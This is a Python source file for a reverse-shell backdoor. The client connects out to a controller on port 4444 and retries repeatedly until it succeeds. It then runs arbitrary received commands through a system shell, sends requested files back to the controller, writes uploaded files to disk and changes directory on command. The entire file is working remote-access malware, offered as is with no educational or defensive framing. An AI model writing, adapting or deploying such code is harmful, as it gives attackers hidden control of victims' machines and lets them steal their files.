import socket
import subprocess
import time
import json
import os


class Server:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        while True:
            time.sleep(2)
            try:
                self.server.connect((self.ip, self.port))
                print("serene self connected")
                self.receive_commands_and_execute()
                break
            except Exception:
                self.connect()

    def read_file(self, path):
        with open(path, "rb") as file:
            data = file.read().decode("utf-8")
            file.close()
            return data

    def change_directory(self, path):
        os.chdir(path)
        return f"Changed directory to {self.execute_command_on_system('pwd')}."

    def write_file(self, file_path, data):
        file_name = os.path.basename(file_path)
        with open(file_name, "wb") as file:
            file.write(data.encode())
            file.close()
            return f"File saved {file_name}"

    def receive_commands_and_execute(self):
        sending_data = ""
        while True:
            try:
                receive = self.reliable_receive()
                split_command = receive
                if split_command[0] == "quit":
                    self.server.close()
                    exit()
                elif split_command[0] == "cd" and split_command[1] is not None:
                    result = self.change_directory(split_command[1])
                    sending_data = result
                elif split_command[0] == "download" and split_command[1] is not None:
                    file = self.read_file(split_command[1])
                    sending_data = file
                elif split_command[0] == "upload" and split_command[1] is not None:
                    self.write_file(split_command[1], split_command[2])
                    sending_data = f"FIle uploaded at {split_command[1]}"
                else:
                    result = self.execute_command_on_system(' '.join(receive))
                    sending_data = result

                self.reliable_send(sending_data)
            except Exception as error:
                print(error)
                self.reliable_send("We encountered an error.")

    def execute_command_on_system(self, command):
        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read()
        result = result.decode()
        return result

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.server.send(json_data.encode())

    def reliable_receive(self):
        data = ''
        while True:
            try:
                data = data + self.server.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue


server = Server('0.0.0.0', 4444)
server.connect()
